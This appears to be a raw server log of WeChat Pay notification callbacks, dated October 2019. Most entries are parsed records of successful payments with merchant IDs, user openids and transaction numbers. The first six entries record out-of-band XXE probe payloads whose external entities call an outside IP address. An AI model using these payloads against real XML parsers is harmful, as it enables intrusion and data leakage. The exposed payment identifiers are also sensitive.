03:13:03|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:13:03|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:24:39|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:24:39|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
03:33:57|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">
%xxe;
]>'
| GET:array (
)
03:33:57|'<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://101.91.62.170:4837/wx_xxe_dbc_os_2019101703_576?aHR0cHM6Ly90ZXN0Lm1pbmdydWktZ3ouY29tL2FwaS9vcmRlci1ub3RpZnk=">]>
<foo><value>&xxe;</value></foo>'
| GET:array (
)
16:49:05|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CCB_CREDIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82afba9afe]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[237062464613706801301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[C60486AC03E99FA5E865704D49A2875F]]></sign>
<time_end><![CDATA[20191017164904]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000419201910175318058110]]></transaction_id>
</xml>'
| GET:array (
)
16:49:05|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CCB_CREDIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82afba9afe',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '237062464613706801301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'C60486AC03E99FA5E865704D49A2875F',
  'time_end' => '20191017164904',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000419201910175318058110',
)
| GET:array (
)
16:49:18|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CCB_CREDIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82b0733d6c]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[292062464614940301301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[DC59E89DC0A07B676E943E0BAC216457]]></sign>
<time_end><![CDATA[20191017164916]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000402201910174017013219]]></transaction_id>
</xml>'
| GET:array (
)
16:49:18|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CCB_CREDIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82b0733d6c',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '292062464614940301301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'DC59E89DC0A07B676E943E0BAC216457',
  'time_end' => '20191017164916',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000402201910174017013219',
)
| GET:array (
)
16:50:05|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CCB_CREDIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82b384e757]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[283062464616283001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[9177829DF54DC8F2E3C2E9A17A14464A]]></sign>
<time_end><![CDATA[20191017165004]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000408201910179703839692]]></transaction_id>
</xml>'
| GET:array (
)
16:50:05|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CCB_CREDIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82b384e757',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '283062464616283001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '9177829DF54DC8F2E3C2E9A17A14464A',
  'time_end' => '20191017165004',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000408201910179703839692',
)
| GET:array (
)
16:50:43|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CCB_CREDIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82b5e92e3e]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[263062464623394001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[CCA7CC8A08519FF687A1A4C1DEFA19C1]]></sign>
<time_end><![CDATA[20191017165043]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000402201910174859631641]]></transaction_id>
</xml>'
| GET:array (
)
16:50:43|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CCB_CREDIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82b5e92e3e',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '263062464623394001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'CCA7CC8A08519FF687A1A4C1DEFA19C1',
  'time_end' => '20191017165043',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000402201910174859631641',
)
| GET:array (
)
16:52:59|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[ICBC_DEBIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82bcea9c3c]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[223062464634631106301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[569C7DB221B9E572AA64BB5A6860F9CC]]></sign>
<time_end><![CDATA[20191017165258]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000412201910178691230130]]></transaction_id>
</xml>'
| GET:array (
)
16:52:59|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'ICBC_DEBIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82bcea9c3c',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '223062464634631106301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '569C7DB221B9E572AA64BB5A6860F9CC',
  'time_end' => '20191017165258',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000412201910178691230130',
)
| GET:array (
)
16:53:32|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[ICBC_DEBIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82bfc08305]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[225062464639044206301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[E68D8C09B657A6A6736FEE50DE2A094C]]></sign>
<time_end><![CDATA[20191017165330]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000405201910173440751140]]></transaction_id>
</xml>'
| GET:array (
)
16:53:32|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'ICBC_DEBIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82bfc08305',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '225062464639044206301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'E68D8C09B657A6A6736FEE50DE2A094C',
  'time_end' => '20191017165330',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000405201910173440751140',
)
| GET:array (
)
16:54:31|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[ICBC_DEBIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82c3a843e4]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[284062464645511406301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[9873FB64C372BF2B39F5B4ABF751B762]]></sign>
<time_end><![CDATA[20191017165430]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000420201910174321507580]]></transaction_id>
</xml>'
| GET:array (
)
16:54:31|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'ICBC_DEBIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82c3a843e4',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '284062464645511406301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '9873FB64C372BF2B39F5B4ABF751B762',
  'time_end' => '20191017165430',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000420201910174321507580',
)
| GET:array (
)
16:56:05|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[ICBC_DEBIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82c9ecfb57]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[215062464655658606301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[6759D44B406E7F3ADCEC4C8E0AD5E68B]]></sign>
<time_end><![CDATA[20191017165604]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000410201910178231819860]]></transaction_id>
</xml>'
| GET:array (
)
16:56:05|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'ICBC_DEBIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82c9ecfb57',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '215062464655658606301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => '6759D44B406E7F3ADCEC4C8E0AD5E68B',
  'time_end' => '20191017165604',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000410201910178231819860',
)
| GET:array (
)
16:56:43|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[CCB_CREDIT]]></bank_type>
<cash_fee><![CDATA[10]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da82cc55f713]]></nonce_str>
<openid><![CDATA[oGq4g5YflK3OAWlSEC11BMc6hk4U]]></openid>
<out_trade_no><![CDATA[284062464629074001301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[ED3AE38F516F80791BC46C6A6F8CEC31]]></sign>
<time_end><![CDATA[20191017165642]]></time_end>
<total_fee>10</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000403201910178170216478]]></transaction_id>
</xml>'
| GET:array (
)
16:56:43|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'CCB_CREDIT',
  'cash_fee' => '10',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da82cc55f713',
  'openid' => 'oGq4g5YflK3OAWlSEC11BMc6hk4U',
  'out_trade_no' => '284062464629074001301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'ED3AE38F516F80791BC46C6A6F8CEC31',
  'time_end' => '20191017165642',
  'total_fee' => '10',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000403201910178170216478',
)
| GET:array (
)
19:17:34|'<xml><appid><![CDATA[wx6be14b9c1bbe7bc0]]></appid>
<bank_type><![CDATA[ICBC_DEBIT]]></bank_type>
<cash_fee><![CDATA[1]]></cash_fee>
<fee_type><![CDATA[CNY]]></fee_type>
<is_subscribe><![CDATA[N]]></is_subscribe>
<mch_id><![CDATA[1543596541]]></mch_id>
<nonce_str><![CDATA[5da84db8108c9]]></nonce_str>
<openid><![CDATA[oGq4g5Sv8hTWTpDAMY4zHHUcCl9I]]></openid>
<out_trade_no><![CDATA[299062465498277706301]]></out_trade_no>
<result_code><![CDATA[SUCCESS]]></result_code>
<return_code><![CDATA[SUCCESS]]></return_code>
<sign><![CDATA[DB7A4EDD5DCEAF1C0796F4D68DCD25F7]]></sign>
<time_end><![CDATA[20191017191733]]></time_end>
<total_fee>1</total_fee>
<trade_type><![CDATA[JSAPI]]></trade_type>
<transaction_id><![CDATA[4200000411201910178210015580]]></transaction_id>
</xml>'
| GET:array (
)
19:17:34|notify  array (
  'appid' => 'wx6be14b9c1bbe7bc0',
  'bank_type' => 'ICBC_DEBIT',
  'cash_fee' => '1',
  'fee_type' => 'CNY',
  'is_subscribe' => 'N',
  'mch_id' => '1543596541',
  'nonce_str' => '5da84db8108c9',
  'openid' => 'oGq4g5Sv8hTWTpDAMY4zHHUcCl9I',
  'out_trade_no' => '299062465498277706301',
  'result_code' => 'SUCCESS',
  'return_code' => 'SUCCESS',
  'sign' => 'DB7A4EDD5DCEAF1C0796F4D68DCD25F7',
  'time_end' => '20191017191733',
  'total_fee' => '1',
  'trade_type' => 'JSAPI',
  'transaction_id' => '4200000411201910178210015580',
)
| GET:array (
)
